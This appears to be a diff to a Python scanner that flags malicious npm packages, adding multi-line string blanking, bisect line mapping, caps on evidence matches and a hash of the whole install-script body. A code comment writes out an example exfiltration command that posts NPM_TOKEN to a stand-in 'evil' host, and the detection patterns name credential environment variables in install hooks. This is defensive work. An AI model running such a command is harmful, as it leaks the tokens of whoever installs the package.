@@ -40,8 +40,10 @@ from __future__ import annotations
 import argparse
 import atexit
 import base64 as _b64  # imported only so the IOC string-scan can detect it
+import bisect
 import hashlib
 import io
+import itertools
 import json
 import os
 import re
@@ -918,24 +920,89 @@ def _bracket_depth(line: str) -> int:
     return s.count("(") + s.count("[") + s.count("{") - s.count(")") - s.count("]") - s.count("}")
 
 
-def _logical_line_text(text: str, line_start: int) -> str:
-    """The matched line plus the bracket group it belongs to: the enclosing
-    multi-line object/call it sits inside (so a changed ``path``/``headers``/body
-    on another line of the same outbound config binds) and any continuation lines
-    after it. String literals are blanked before counting so a bracket inside a
-    string does not miscount. The opener is searched ``_MAX_CONT_LINES`` lines
-    back; the group is then followed to its close up to ``_MAX_GROUP_LINES`` so a
-    config object longer than the backward window still binds its whole tail in
-    the digest (only a pathological unclosed group truncates)."""
-    lines = text.split("\n")
-    idx = text.count("\n", 0, line_start)  # 0-based line index of the match
+def _find_unescaped(line: str, quote: str, start: int) -> int:
+    """Index of the next ``quote`` at or after ``start`` not escaped by a backslash,
+    or -1. Skips ``\\x`` pairs so an escaped quote inside the string is ignored."""
+    i, n = start, len(line)
+    while i < n:
+        if line[i] == "\\":
+            i += 2
+            continue
+        if line[i] == quote:
+            return i
+        i += 1
+    return -1
 
+
+def _blank_js_strings(lines: list[str]) -> list[str]:
+    """Replace string contents (single, double, and multi-line backtick template
+    literals, escapes honoured) with spaces across ``lines``, keeping the line
+    count and every bracket OUTSIDE a string intact, so bracket counting never
+    miscounts a ``)`` that lives inside a string -- including a template literal
+    that spans several lines, which a per-line regex cannot blank."""
+    out: list[str] = []
+    in_back = False  # inside a multi-line `template` literal
+    for line in lines:
+        buf: list[str] = []
+        i, n = 0, len(line)
+        while i < n:
+            if in_back:
+                end = _find_unescaped(line, "`", i)
+                if end == -1:
+                    buf.append(" " * (n - i))
+                    i = n
+                else:
+                    buf.append(" " * (end - i + 1))
+                    i = end + 1
+                    in_back = False
+                continue
+            ch = line[i]
+            if ch in "'\"`":
+                end = _find_unescaped(line, ch, i + 1)
+                if end == -1:
+                    buf.append(" " * (n - i))
+                    i = n
+                    if ch == "`":  # opens a template literal that runs past this line
+                        in_back = True
+                else:
+                    buf.append(" " * (end - i + 1))
+                    i = end + 1
+                continue
+            buf.append(ch)
+            i += 1
+        out.append("".join(buf))
+    return out
+
+
+def _index_text(text: str) -> tuple[list[str], list[str], list[str], list[int]]:
+    """Precompute once per evidence call: raw lines for display, two string-blanked
+    views for bracket counting (single-line via regex = legacy, and multi-line
+    aware so a template literal spanning lines is blanked), and newline offsets for
+    O(log n) offset-to-line mapping. Avoids re-splitting and re-counting the whole
+    file on every single match (which was O(matches x file size))."""
+    lines = text.split("\n")
+    sl_blanked = [_RE_JS_STR.sub("", ln) for ln in lines]
+    ml_blanked = _blank_js_strings(lines)
+    nl = [p for p, ch in enumerate(text) if ch == "\n"]
+    return lines, sl_blanked, ml_blanked, nl
+
+
+# Cap on formatted matches in one evidence string; beyond it the remaining match
+# texts are folded into a single digest so a huge/minified file cannot build a
+# multi-megabyte evidence blob while an added/removed match past the cap still
+# changes the key.
+_MAX_EVIDENCE_MATCHES = 64
+
+
+def _scan_group(blanked: list[str], idx: int) -> tuple[int, int]:
+    """(start, end) line indices of the bracket group enclosing line ``idx`` in one
+    blanked view: scan back to the still-open opener, then forward to its close."""
     # Backward: find the line that opens a bracket still unclosed at the match,
     # so a match inside a multi-line object starts from the object opener.
     start = idx
     depth = 0
     for j in range(max(0, idx - _MAX_CONT_LINES), idx):
-        depth += _bracket_depth(lines[j])
+        depth += _bracket_depth(blanked[j])
         if depth <= 0:
             # The window can start mid-block, so a leading unmatched `}` (its opener
             # outside the window) would drive depth negative and mask a real opener
@@ -952,24 +1019,51 @@ def _logical_line_text(text: str, line_start: int) -> str:
     # the path/headers/body that follow the matched line.
     depth = 0
     end = start
-    for j in range(start, min(len(lines), idx + _MAX_GROUP_LINES)):
-        depth += _bracket_depth(lines[j])
+    for j in range(start, min(len(blanked), idx + _MAX_GROUP_LINES)):
+        depth += _bracket_depth(blanked[j])
         end = j
         if j >= idx and depth <= 0:
             break
+    return start, end
+
+
+def _logical_line_text(
+    lines: list[str], sl_blanked: list[str], ml_blanked: list[str], idx: int
+) -> str:
+    """The matched line plus the bracket group it belongs to (the enclosing
+    multi-line object/call, so a changed ``path``/``headers``/body on another line
+    binds). Returns the UNION of the groups found in the single-line-blanked view
+    (legacy: a payload embedded inside a template still counts so its brackets bind
+    the call) and the multi-line-blanked view (a bracket inside a template literal
+    spanning lines no longer closes the group early). Unioning never shrinks the
+    span below either view, so neither blanking strategy can drop a line a
+    malicious change relies on."""
+    s1, e1 = _scan_group(sl_blanked, idx)
+    s2, e2 = _scan_group(ml_blanked, idx)
+    start, end = min(s1, s2), max(e1, e2)
     return " ".join(lines[start : end + 1])
 
 
-def _format_match(text: str, m: re.Match, max_chars: int) -> str:
+def _format_match(
+    text: str,
+    lines: list[str],
+    sl_blanked: list[str],
+    ml_blanked: list[str],
+    nl: list[int],
+    m: re.Match,
+    max_chars: int,
+) -> str:
     # The shown snippet is a small window around the match; append a digest of the
     # full LOGICAL line (the matched line plus its bracket-continuation lines)
     # whenever the snippet does not already show all of it, so a changed payload
-    # tail, a truncated body, or a multi-line option/header reopens.
-    line_start = text.rfind("\n", 0, m.start()) + 1
-    line_end = text.find("\n", m.end())
-    if line_end == -1:
-        line_end = len(text)
-    full_logical = _logical_line_text(text, line_start)
+    # tail, a truncated body, or a multi-line option/header reopens. Offsets are
+    # mapped to line numbers via bisect over precomputed newline positions, so this
+    # is O(log n) instead of rescanning the file prefix for every match.
+    idx = bisect.bisect_left(nl, m.start())  # 0-based line index of the match
+    line_start = nl[idx - 1] + 1 if idx > 0 else 0
+    ke = bisect.bisect_left(nl, m.end())
+    line_end = nl[ke] if ke < len(nl) else len(text)
+    full_logical = _logical_line_text(lines, sl_blanked, ml_blanked, idx)
     start = max(line_start, m.start() - 30)
     end = min(line_end, m.end() + 30)
     snippet = text[start:end].replace("\n", " ")
@@ -992,7 +1086,21 @@ def _evidence(
 ) -> str:
     # Record every match (not a truncated sample) so an extra match appended to an
     # already-flagged file changes the evidence instead of riding the first few.
-    return " | ".join(_format_match(text, m, max_chars) for m in pat.finditer(text))
+    # Past _MAX_EVIDENCE_MATCHES the remaining match texts are folded into one
+    # digest so the evidence string stays bounded while still reopening on change.
+    matches = list(pat.finditer(text))
+    if not matches:
+        return ""
+    lines, sl_blanked, ml_blanked, nl = _index_text(text)
+    shown = [
+        _format_match(text, lines, sl_blanked, ml_blanked, nl, m, max_chars)
+        for m in matches[:_MAX_EVIDENCE_MATCHES]
+    ]
+    if len(matches) > _MAX_EVIDENCE_MATCHES:
+        rest = " ".join(text[m.start() : m.end()] for m in matches[_MAX_EVIDENCE_MATCHES:])
+        digest = hashlib.sha256(" ".join(rest.split()).encode("utf-8", "replace")).hexdigest()
+        shown.append(f"(+{len(matches) - _MAX_EVIDENCE_MATCHES} more) sha256:{digest}")
+    return " | ".join(shown)
 
 
 LIFECYCLE_HOOKS = ("preinstall", "install", "postinstall", "prepare")
@@ -1247,13 +1355,21 @@ def scan_package_json(pkg: PackageEntry, rel: str, text: str) -> list[Finding]:
                     )
                 )
         if _JS_ENV_TOKEN.search(body):
+            # Pin the whole lifecycle body, not just the token line: a script that
+            # keeps the credential env reference but changes another line (e.g.
+            # swapping `echo safe` for `curl -d "$NPM_TOKEN" https://evil`) must
+            # reopen. Whitespace-normalized to match _evidence_hash so a reindent
+            # alone does not reopen.
+            body_digest = hashlib.sha256(
+                " ".join(body.split()).encode("utf-8", "replace")
+            ).hexdigest()
             findings.append(
                 Finding(
                     severity = HIGH,
                     package = pkg.display,
                     filename = rel,
                     pattern = f"cred-env-in-lifecycle ({hook})",
-                    evidence = _evidence(body, _JS_ENV_TOKEN),
+                    evidence = f"{_evidence(body, _JS_ENV_TOKEN)} body-sha256:{body_digest}",
                     detail = (
                         f"`scripts.{hook}` references a credential "
                         "env var (GITHUB_TOKEN / NPM_TOKEN / AWS_* "
@@ -1340,19 +1456,33 @@ def _outbound_host_evidence(text: str, host: str) -> str:
     # a separate host-config request (or a second URL) must change the evidence so
     # the new payload cannot inherit the old key. Forms are claimed in order, and a
     # region already claimed by an earlier form is skipped, so the common
-    # single-context case keeps its existing snippet.
+    # single-context case keeps its existing snippet. Each form is capped at
+    # _MAX_EVIDENCE_MATCHES matches so a host repeated thousands of times in a
+    # minified file cannot make the overlap check quadratic; once chosen is full
+    # the rest are folded into a digest so an added context still reopens.
     claimed: list[tuple[int, int]] = []
     chosen: list[re.Match] = []
+    overflow: list[str] = []
     for pat in patterns:
-        for m in pat.finditer(text):
+        for m in itertools.islice(pat.finditer(text), _MAX_EVIDENCE_MATCHES):
             if any(m.start() < e and s < m.end() for s, e in claimed):
                 continue
-            claimed.append((m.start(), m.end()))
-            chosen.append(m)
+            if len(chosen) < _MAX_EVIDENCE_MATCHES:
+                claimed.append((m.start(), m.end()))
+                chosen.append(m)
+            else:
+                overflow.append(text[m.start() : m.end()])
     if not chosen:
         return host
     chosen.sort(key = lambda m: m.start())
-    return " | ".join(_format_match(text, m, 1000) for m in chosen)
+    lines, sl_blanked, ml_blanked, nl = _index_text(text)
+    shown = [_format_match(text, lines, sl_blanked, ml_blanked, nl, m, 1000) for m in chosen]
+    if overflow:
+        digest = hashlib.sha256(
+            " ".join(" ".join(o.split()) for o in overflow).encode("utf-8", "replace")
+        ).hexdigest()
+        shown.append(f"(+{len(overflow)} more) sha256:{digest}")
+    return " | ".join(shown)
 
 
 def scan_text_blob(pkg: PackageEntry, rel: str, text: str) -> list[Finding]:
